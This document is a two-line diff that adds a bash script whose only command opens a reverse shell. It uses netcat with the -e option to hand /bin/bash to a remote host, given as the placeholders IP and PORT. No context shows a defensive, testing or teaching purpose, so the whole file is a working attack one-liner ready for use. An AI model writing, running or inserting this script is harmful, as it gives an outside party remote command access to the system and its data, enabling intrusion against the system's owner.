@@ -1,0 +1,2 @@
+#!/bin/bash
+bash -c 'exec nc IP PORT -e /bin/bash'
